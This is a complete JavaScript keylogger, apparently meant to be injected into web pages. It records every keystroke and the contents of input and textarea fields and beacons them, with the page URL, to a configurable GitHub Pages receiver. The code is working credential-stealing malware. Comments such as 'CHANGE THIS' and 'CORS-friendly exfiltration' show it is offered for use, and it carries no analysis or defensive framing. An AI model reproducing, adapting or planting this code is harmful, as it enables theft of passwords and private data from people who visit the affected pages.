// keylogger.js — captures keystrokes and sends to your GitHub Pages receiver
(function() {
    let buffer = '';
    let lastSent = Date.now();
    const RECEIVER_URL = 'https://YOUR_USERNAME.github.io/receiver.html'; // CHANGE THIS
    const FLUSH_INTERVAL = 3000;

    document.onkeydown = function(e) {
        const key = e.key;
        if (key === undefined) return;

        const specialKeys = {
            'Enter': '[ENTER]\n',
            'Tab': '[TAB]',
            'Backspace': '[BACKSPACE]',
            'Shift': '[SHIFT]',
            'Control': '[CTRL]',
            'Alt': '[ALT]',
            'CapsLock': '[CAPSLOCK]',
            'Escape': '[ESC]',
            'ArrowUp': '[UP]',
            'ArrowDown': '[DOWN]',
            'ArrowLeft': '[LEFT]',
            'ArrowRight': '[RIGHT]',
            'Delete': '[DEL]',
            'Home': '[HOME]',
            'End': '[END]',
            'PageUp': '[PGUP]',
            'PageDown': '[PGDN]',
            'Meta': '[WIN]'
        };

        if (specialKeys[key]) {
            buffer += specialKeys[key];
        } else if (key.length === 1) {
            buffer += key;
        }

        if (Date.now() - lastSent >= FLUSH_INTERVAL || key === 'Enter') {
            sendBuffer();
            lastSent = Date.now();
        }
    };

    document.addEventListener('input', function(e) {
        const tag = e.target.tagName.toLowerCase();
        if (tag === 'input' || tag === 'textarea') {
            buffer += e.target.value.slice(-1);
        }
    });

    function sendBuffer() {
        if (buffer.length === 0) return;
        const data = buffer;
        buffer = '';

        // Use Image beacon for CORS-friendly exfiltration
        const img = new Image();
        img.src = RECEIVER_URL + '?k=' + encodeURIComponent(data) +
                  '&u=' + encodeURIComponent(window.location.href) +
                  '&t=' + Date.now();
    }

    window.addEventListener('beforeunload', sendBuffer);
})();
